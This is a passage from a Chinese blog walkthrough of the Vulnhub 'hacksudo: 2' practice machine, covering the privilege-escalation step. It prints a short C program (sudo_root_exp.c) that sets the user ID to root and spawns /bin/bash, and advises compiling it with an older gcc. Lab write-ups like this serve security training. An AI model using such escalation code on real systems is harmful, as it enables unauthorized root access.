+<p>找个低版本的传过去提权</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404021231888.png" /></p>
+<p>成功！</p>
+<p>按这个方法【<a
+target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1708369">Linux提权姿势二：利用NFS提权-腾讯云开发者社区-腾讯云</a>】也可</p>
+<p>sudo_root_exp.c</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span> </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123; setuid(<span class="number">0</span>); system(<span class="string">&quot;/bin/bash&quot;</span>); <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br></pre></td></tr></table></figure>
+<p>本地用<strong>低版本</strong> gcc 编译好直接传上去，经测
+<code>gcc version 10.3.0 (Ubuntu 10.3.0-1ubuntu1~20.10)</code> 可行</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404021236658.png" /></p>
+<p>成功！</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Ghost
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://z9m8r8.github.io/2024/04/02/hacksudo%202%20(HackDudo)/" title="hacksudo: 2 (HackDudo)">https://z9m8r8.github.io/2024/04/02/hacksudo 2 (HackDudo)/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Vulnhub-%E9%9D%B6%E5%9C%BA/" rel="tag"><i class="fa fa-tag"></i> Vulnhub 靶场</a>
+              <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag"><i class="fa fa-tag"></i> 信息收集</a>
+              <a href="/tags/%E6%8F%90%E6%9D%83/" rel="tag"><i class="fa fa-tag"></i> 提权</a>
+              <a href="/tags/%E5%8F%8D%E5%BC%B9-shell/" rel="tag"><i class="fa fa-tag"></i> 反弹 shell</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/04/01/VulnCMS%201/" rel="prev" title="VulnCMS: 1">
+                  <i class="fa fa-angle-left"></i> VulnCMS: 1
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2024/04/02/hacksudo%203/" rel="next" title="hacksudo: 3">
+                  hacksudo: 3 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2020 – 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Ghost</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">192k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">11:37</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/z9m8r8" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.umd.js" integrity="sha256-ytMJGN3toR+a84u7g7NuHm91VIR06Q41kMWDr2pq7Zo=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script><script src="/js/pjax.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"ams","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/quicklink/2.3.0/quicklink.umd.js" integrity="sha256-yvJQOINiH9fWemHn0vCA5lsHWJaHs6/ZmO+1Ft04SvM=" crossorigin="anonymous"></script>
+  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"url":"https://z9m8r8.github.io/2024/04/02/hacksudo%202%20(HackDudo)/"}</script>
+  <script src="/js/third-party/quicklink.js"></script>
+
+</body>
+</html>
